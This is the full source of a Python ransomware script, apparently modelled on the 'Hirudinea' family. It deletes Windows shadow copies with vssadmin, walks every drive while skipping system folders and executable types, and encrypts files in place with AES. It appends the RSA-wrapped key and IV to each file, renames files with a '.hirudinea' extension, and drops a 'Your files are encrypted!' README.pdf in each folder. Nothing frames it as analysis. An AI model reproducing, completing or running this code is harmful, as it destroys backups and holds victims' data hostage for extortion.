import os
import string
import subprocess
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from fpdf import FPDF

def delete_shadow_copies():
    # Command to delete system shadow copies
    command = "vssadmin delete shadows /all /quiet"
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Failed to delete shadow copies: {e}")

def encrypt_file(file_path, cipher, rsa_cipher):
    file_size = os.path.getsize(file_path)
    section_size = 1 * 1024 * 1024  # 1MB section size for processing

    try:
        with open(file_path, 'rb+') as file:
            if file_size <= 2 * 1024 * 1024:  # File sizes 0-2MB, don't divide
                data = file.read(section_size)
                encrypted_data = cipher.encrypt(data)
                file.seek(0)
                file.write(encrypted_data)
            elif 2 * 1024 * 1024 < file_size <= 3 * 1024 * 1024:  # File size 2-3MB, divide into 2 sections
                for _ in range(2):
                    data = file.read(section_size)
                    encrypted_data = cipher.encrypt(data)
                    file.seek(-len(data), 1)  # Go back to the start of the read section
                    file.write(encrypted_data)
            elif file_size > 4 * 1024 * 1024:  # File size >4MB, divide into 4 sections
                for _ in range(4):
                    data = file.read(section_size)
                    encrypted_data = cipher.encrypt(data)
                    file.seek(-len(data), 1)  # Go back to the start of the read section
                    file.write(encrypted_data)
            # Encrypt the AES key and IV with RSA and append to the file
            encrypted_key = rsa_cipher.encrypt(cipher.key)
            encrypted_iv = rsa_cipher.encrypt(cipher.iv)
            file.write(encrypted_key)
            file.write(encrypted_iv)
        os.rename(file_path, file_path + ".hirudinea")
    except PermissionError:
        print(f"Permission denied: {file_path}")

def create_readme_pdf(directory):
    pdf = FPDF()
    pdf.add_page()
    pdf.set_font("Arial", size=12)
    pdf.cell(200, 10, txt="Your files are encrypted!", ln=True, align='C')
    pdf.output(os.path.join(directory, "README.pdf"))

ignored_directories = [
    "$Recycle.Bin", "Boot", "Documents and Settings", "PerfLogs", "Program Files",
    "Program Files (x86)", "ProgramData", "Recovery", "System Volume Information", "Windows", "$RECYCLE.BIN"
]
ignored_extensions = [
    ".bat", ".bin", ".cab", ".cd", ".com", ".cur", ".dagaba", ".diagcfg", ".diagpkg", ".drv", ".dll",
    ".exe", ".hlp", ".hta", ".ico", ".lnk", ".msi", ".ocx", ".ps1", ".psm1", ".scr", ".sys", ".ini",
    "Thumbs.db", ".url", ".iso"
]

# Public RSA key (replace this with your actual public key)
public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnzJHpM58tYs0IZxxo1Yd
4Tptbv02PFEwhGDWLF5bPFNeM0q2uiy/9CqNRD2Xzeyq8Zea6Hl5ivs3Pb9B0SpI
0tUxod6CZLKb5XTrlAc0X761Cs4tCuXEKJpNcZ5v4+kXE84zjMbAHMeRZZldFO9K
jYWh4zszM6sEdKchJBz5p/9Ndkjc2Pbnjxz72aISZ3TFTgEKZjRBYADVc+4cpn5C
azYsGCY5mclyF0sALHV9wr+MX+C0kTpCN/RtY8FR3TDt5tBz9UBIBRThO7L7eg5d
XmXv1cWhymXwIWLAZRpzDyF0ZaALGhoMdlC2dF78ds7j5wIDAQAB
-----END PUBLIC KEY-----
"""
rsa_key = RSA.importKey(public_key)
rsa_cipher = PKCS1_OAEP.new(rsa_key)

# Create an AES CTR cipher with a random key and a random IV
key = get_random_bytes(16)  # AES key length can be 16, 24, or 32 bytes
iv = get_random_bytes(16)   # AES block size is always 16 bytes
cipher = AES.new(key, AES.MODE_CTR, nonce=b'', initial_value=iv)

# Delete shadow copies before encryption
delete_shadow_copies()

# Iterate over all drives and files
drives = ['{}:\\'.format(d) for d in string.ascii_uppercase[::-1] if os.path.exists('{}:\\'.format(d))]
for drive in drives:
    for root, dirs, files in os.walk(drive):
        # Check if directory should be ignored
        if any(ignored_dir.lower() in root.lower() for ignored_dir in ignored_directories):
            continue
        encryptable_files = [file for file in files if not any(file.lower().endswith(ext) for ext in ignored_extensions)]
        for file in encryptable_files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, cipher, rsa_cipher)
        if encryptable_files:  # After processing all files in the directory, create a README.pdf
            create_readme_pdf(root)

# Delete shadow copies after encryption
delete_shadow_copies()

print("Encryption complete.")

